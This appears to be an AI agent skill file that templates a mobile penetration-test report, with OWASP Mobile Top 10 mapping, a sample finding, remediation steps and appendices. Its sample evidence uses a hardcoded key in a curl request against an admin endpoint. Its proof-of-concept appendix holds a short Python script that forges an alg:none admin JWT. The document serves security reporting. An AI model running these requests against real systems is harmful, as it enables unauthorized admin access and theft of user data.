---
name: mobile-report
description: "Mobile pentest report generation skill. Compiles Android/iOS static and dynamic findings into a structured security report with CVSS scores, PoCs, and OWASP Mobile Top 10 mapping. Triggers: 'mobile report', 'mobile pentest report', 'owasp mobile', 'apk report', 'ios security report'."
---

# Mobile Pentest Report Generation

You are generating a **mobile application security assessment report** from findings across Android and iOS analysis phases.

## OWASP Mobile Top 10 Reference

Map every finding to the relevant OWASP category:

| ID | Category |
|:---|:---|
| M1 | Improper Credential Usage |
| M2 | Inadequate Supply Chain Security |
| M3 | Insecure Authentication/Authorization |
| M4 | Insufficient Input/Output Validation |
| M5 | Insecure Communication |
| M6 | Inadequate Privacy Controls |
| M7 | Insufficient Binary Protections |
| M8 | Security Misconfiguration |
| M9 | Insecure Data Storage |
| M10 | Insufficient Cryptography |

## Report Structure

### 1. Executive Summary

```markdown
## Executive Summary

**Application:** TargetApp v2.1.4
**Platform:** Android / iOS
**Assessment Type:** Black-box / Grey-box
**Date:** 2026-06-20
**Analyst:** [Name]

### Risk Summary

| Severity | Count |
|:---|:---:|
| Critical | 2 |
| High | 5 |
| Medium | 8 |
| Low | 3 |
| Informational | 6 |

### Key Findings
- Hardcoded API key in binary gives full backend access
- SSL pinning disabled — all traffic interceptable
- SQLite database stores credentials in plaintext
- Insecure Direct Object Reference on /api/v1/user/{id}
- JWT with alg:none accepted — authentication bypass
```

### 2. Findings Template (repeat for each finding)

```markdown
## [CRIT-001] Hardcoded API Key

**Severity:** Critical
**CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**OWASP Mobile:** M1 — Improper Credential Usage
**Platform:** Android

### Description
The application contains a hardcoded API key embedded in the compiled binary.
The key grants full access to the backend API including admin endpoints.

### Evidence
```
# Found via jadx/strings analysis
$ strings target.apk | grep -i "api_key"
api_key=sk-prod-XXXXXXXXXXXXXXXXXXXX

# Verified — key works against production API:
$ curl -H "X-API-Key: sk-prod-XXXXXXXXXXXXXXXXXXXX" https://api.target.com/admin/users
{"users": [...all user records...]}
```

### Impact
Any party who reverse engineers the APK (trivial, APKs are ZIP files) gains full API access.
This exposes all user data, admin functionality, and backend systems.

### Remediation
1. Remove hardcoded key immediately — rotate the exposed key NOW
2. Store API keys server-side; issue short-lived, scoped tokens to authenticated users
3. Never embed static secrets in mobile binaries
4. Implement certificate pinning to prevent traffic interception
```

### 3. OWASP Mobile Top 10 Coverage

```markdown
## OWASP Mobile Top 10 Coverage

| Category | Status | Findings |
|:---|:---|:---|
| M1 — Credential Usage | FAIL | Hardcoded API key, stored passwords |
| M2 — Supply Chain | PASS | No issues found |
| M3 — Authentication | FAIL | JWT alg:none, session fixation |
| M4 — Input Validation | PARTIAL | SQL injection in search (low risk) |
| M5 — Communication | FAIL | SSL pinning missing, TLS 1.0 allowed |
| M6 — Privacy Controls | FAIL | PII in logs, no consent for analytics |
| M7 — Binary Protections | FAIL | No obfuscation, debuggable=true in prod |
| M8 — Misconfiguration | FAIL | allowBackup=true, exported components |
| M9 — Data Storage | FAIL | Credentials in SharedPreferences plaintext |
| M10 — Cryptography | FAIL | MD5 for password hashing |
```

### 4. Technical Appendix

```markdown
## Appendix A: Static Analysis Details

### Build Configuration
- Minimum SDK: 21 (Android 5.0)
- Target SDK: 34 (Android 14)
- Debuggable: true ⚠️
- AllowBackup: true ⚠️
- Network Security Config: AllowsArbitraryLoads = true ⚠️

### Exported Components
| Component | Type | Exported | Risk |
|:---|:---|:---|:---|
| com.target.app.LoginActivity | Activity | true | Can be launched by any app |
| com.target.app.SyncService | Service | true | Can be triggered externally |

### Permissions Requested
| Permission | Risk | Justification |
|:---|:---|:---|
| READ_CONTACTS | High | No apparent in-app feature |
| RECORD_AUDIO | High | No apparent in-app feature |
| ACCESS_FINE_LOCATION | Medium | Used for delivery features |

## Appendix B: Proof of Concepts

All PoCs tested in isolated test environment, not production.

### PoC-001: JWT Authentication Bypass

```python
import base64, json, requests

# Forge admin JWT with alg:none
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin","exp":9999999999}).encode()).decode().rstrip("=")
forged_jwt = f"{header}.{payload}."

r = requests.get("https://api.target.com/v1/admin/users",
                  headers={"Authorization": f"Bearer {forged_jwt}"})
print(r.status_code, r.json())  # 200 — full admin access
```
```

## Output

Save to: `.omop/engagement/report/mobile-pentest-<app>-<date>.md`

Also generate:
- Machine-readable findings: `mobile-findings.json`
- CVSS scores spreadsheet: `cvss-scores.csv`
